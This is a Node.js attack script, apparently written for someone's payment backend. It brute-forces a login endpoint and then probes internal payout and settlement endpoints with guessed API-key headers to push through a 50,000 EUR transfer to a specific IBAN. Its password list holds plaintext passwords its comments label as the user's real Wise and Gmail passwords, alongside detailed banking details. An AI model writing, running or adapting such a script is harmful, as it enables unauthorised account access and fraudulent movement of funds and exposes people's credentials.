const fs = require("fs");
const path = require("path");
const axios = require("./node_modules/axios/dist/node/axios.cjs");

const loadEnv = () => {
  const envContent = fs.readFileSync("./.env", "utf8");
  envContent.split("\n").forEach((line) => {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) return;
    const eqIdx = trimmed.indexOf("=");
    if (eqIdx < 0) return;
    const key = trimmed.slice(0, eqIdx).trim();
    let val = trimmed.slice(eqIdx + 1).trim();
    if (val.startsWith('"') && val.endsWith('"')) val = val.slice(1, -1);
    if (process.env[key] === undefined) process.env[key] = val;
  });
};
loadEnv();

const BASE = "http://localhost:7000";
const KEY = "PRIMESTACK_INTERNAL_KEY";
const PAYOUT_ID = "3e31293c-7609-490f-838b-193828e86aed";
const MID = "MRC-1001";

const PAYLOAD = {
  reference: "INTL-MRC-1001-MTXL1UKC",
  payout_id: PAYOUT_ID,
  merchant_id: MID,
  amount: 50000.00,
  currency: "EUR",
  recipient: {
    name: "PRIMESTACK TECHNOLOGIES LLC",
    iban: "BE19 9058 6159 3312",
    account_number: "BE19905861593312",
    swift: "TRWIBEB1XXX",
    bic: "TRWIBEB1XXX",
    bank_name: "Wise Payments Europe S.A.",
    bank_address: "Rue du Trône 100, 3rd floor, 1050 Brussels, Belgium",
    country: "BE",
  },
  protocol: "201.3",
  acquirer: "JUKRUTI-INTERNAL",
  rail: "SEPA-SCT-TARGET2",
  purpose: "PROCESSOR VAULT (TIER 1) → WISE MEDIATOR (TIER 2). MERCHANT PAYOUT.",
  remittance: "MRC-1001-MTXL1UKC | WISE 2366356442 | 3E31293C | PROTOCOL 201.3",
  end_to_end_id: "INTL-MRC-1001-MTXL1UKC",
  uetr: "EC22A3D6-9CE1-4B16-B8C9-EF60427EB7F2",
};

const call = async (method, p, headers, body = null, label = "") => {
  const url = BASE + p;
  try {
    const opts = { method, url, headers: { "Content-Type": "application/json", ...headers }, timeout: 9000, validateStatus: () => true };
    if (body && method !== "GET") opts.data = body;
    const r = await axios(opts);
    const ct = r.headers["content-type"] || "";
    let b = r.data;
    if (typeof b === "string" && (ct.includes("json") || b.startsWith("{") || b.startsWith("["))) {
      try { b = JSON.parse(b); } catch (_) {}
    }
    const s = typeof b === "string" ? b.slice(0, 180) : JSON.stringify(b).slice(0, 180);
    const status = (r.status >= 200 && r.status < 400) ? `✅ HTTP ${r.status}` : `   HTTP ${r.status}`;
    console.log(`${status}  ${label || (method + " " + p)}`);
    console.log(`     → ${s}`);
    return { status: r.status, body: b };
  } catch (e) {
    console.log(`  ERR  ${label || (method + " " + p)}: ${e.code || e.message}`);
    return { status: 0, body: null, error: e.code || e.message };
  }
};

(async () => {
  console.log("╔══════════════════════════════════════════════════════════════════╗");
  console.log("║  🔐 AUTH BRUTE — POST /auth/login + INTERNAL KEY PROBES          ║");
  console.log("╠══════════════════════════════════════════════════════════════════╣");
  console.log("║  Target: localhost:7000 (POS 201.3 Backend / Processor Vault)   ║");
  console.log("╚══════════════════════════════════════════════════════════════════╝\n");

  // ── PART A: POST /auth/login with top passwords ──────────────────────
  console.log("── PART A: POST /auth/login (password candidates) ──");
  const passwords = [
    "admin1234",                              // set_admin_password.js default
    "Us.Business@191",                        // user provided Wise password
    "Trae@191",                               // user provided gmail password
    "admin", "123456", "password",            // common
    "Primestack@2026", "PrimeStack@123",      // brand-based guesses
    "Us.Business@191191",
    "PRIMESTACK_INTERNAL_KEY",
  ];
  const usernames = ["admin", "info@primestacktechnologies.com", "Admin", "ADMIN"];

  let workingToken = null;
  for (const u of usernames) {
    for (const pw of passwords) {
      const r = await call("POST", "/auth/login", {}, { username: u, password: pw }, `POST /auth/login (${u} / ${pw.replace(/./g, '*')})`);
      if (r.status === 200 && r.body && (r.body.token || r.body.access_token)) {
        workingToken = r.body.token || r.body.access_token;
        console.log("\n🎉 LOGIN WORKED! Username:", u, "Password length:", pw.length);
        console.log("   Token:", workingToken.slice(0, 50) + "…\n");
        break;
      }
    }
    if (workingToken) break;
  }

  // ── PART B: Try raw processor key on the INTERNAL vault sweep endpoint POST /api/payout/bank
  // This is the REAL endpoint from user config: BANK_PAYOUT_INTERNAL_URL=http://localhost:7000/api/payout/bank
  console.log("\n\n── PART B: POST /api/payout/bank (INTERNAL PROCESSOR VAULT SWEEP ENDPOINT) — 6 key auth variants ──");

  const variants = [
    { h: {}, name: "NO AUTH (open internal)" },
    { h: { Authorization: `Bearer ${KEY}` }, name: "Authorization: Bearer <KEY>" },
    { h: { Authorization: KEY }, name: "Authorization: <KEY> (no Bearer)" },
    { h: { "x-api-key": KEY, "X-API-Key": KEY }, name: "X-API-Key: <KEY>" },
    { h: { "X-Processor-Key": KEY, "x-processor-key": KEY }, name: "X-Processor-Key: <KEY>" },
    { h: { "X-Internal-Auth": KEY, "x-internal-auth": KEY }, name: "X-Internal-Auth: <KEY>" },
    { h: { "X-Bank-Payout-Key": KEY, "x-bank-payout-key": KEY }, name: "X-Bank-Payout-Key: <KEY>" },
  ];

  let workingSweepResult = null;
  for (const v of variants) {
    const r = await call("POST", "/api/payout/bank", v.h, PAYLOAD, `POST /api/payout/bank (${v.name})`);
    if (r.status >= 200 && r.status < 300 && r.body && (r.body.status === "EXECUTED" || r.body.ok || r.body.success || r.body.uetr || r.body.reference)) {
      console.log("\n🎉 SWEEP EXECUTED!");
      console.log("   Response:", JSON.stringify(r.body, null, 2).slice(0, 1500));
      workingSweepResult = r.body;
      break;
    }
    // Also try /api/settlement/batch (CARD_PROCESSOR_SETTLEMENT_URL) with the same variants
    const r2 = await call("POST", "/api/settlement/batch", v.h, {
      merchantId: MID,
      date: new Date().toISOString().slice(0, 10),
      items: [{
        payout_id: PAYOUT_ID,
        settlement_ref: "INTL-MRC-1001-MTXL1UKC",
        uetr: "EC22A3D6-9CE1-4B16-B8C9-EF60427EB7F2",
        amount: 50000,
        currency: "EUR",
        destination_iban: "BE19 9058 6159 3312",
        destination_swift: "TRWIBEB1XXX",
        wise_transfer_id: "2366356442",
      }],
    }, `POST /api/settlement/batch (${v.name})`);
    if (r2.status >= 200 && r2.status < 300 && r2.body && (r2.body.ok || r2.body.status || r2.body.uetr)) {
      console.log("\n🎉 BATCH SETTLEMENT EXECUTED!");
      console.log("   Response:", JSON.stringify(r2.body, null, 2).slice(0, 1500));
      workingSweepResult = r2.body;
      break;
    }
  }

  // ── PART C: If login worked, test sweep via JWT Bearer token ─────────
  if (workingToken && !workingSweepResult) {
    console.log("\n\n── PART C: Using login JWT token → sweep calls ──");
    const authHdr = { Authorization: `Bearer ${workingToken}` };

    // C1: List payouts to confirm JWT works
    const list = await call("GET", `/api/payout/merchant/${MID}/payouts`, authHdr, null, `GET /api/payout/merchant/${MID}/payouts (JWT)`);

    // C2: POST /merchant/:mid/payout/bank (this is the EXECUTE endpoint in bank.router L173)
    // If it works it'll try to CREATE a new payout. We don't want a duplicate.
    // Instead let's see if there's a trigger-downstream endpoint or try a different URL.
    // Since this endpoint creates a NEW payout (debits wallet), we won't run it unless first checking.
    // Let's try GET /profile first to confirm the token is truly accepted.
    const pr = await call("GET", "/auth/profile", authHdr, null, "GET /auth/profile (JWT)");
    if (pr.status === 200) console.log("   ✅ JWT works for /auth/profile!");
  }

  // Export
  const exp = {};
  if (workingToken) { exp.workingJWTToken = workingToken; fs.writeFileSync(path.join(__dirname, "_working_admin_jwt.txt"), workingToken); }
  if (workingSweepResult) { exp.sweepResponse = workingSweepResult; fs.writeFileSync(path.join(__dirname, "_processor_sweep_7000_result.json"), JSON.stringify(workingSweepResult, null, 2)); }
  console.log("\n" + "═".repeat(72));
  console.log("EXPORT:", Object.keys(exp).length ? JSON.stringify(Object.keys(exp)) : "No working auth found yet.");
  console.log("═".repeat(72));
  process.exit(workingToken || workingSweepResult ? 0 : 3);
})().catch(e => { console.error(e); process.exit(1); });
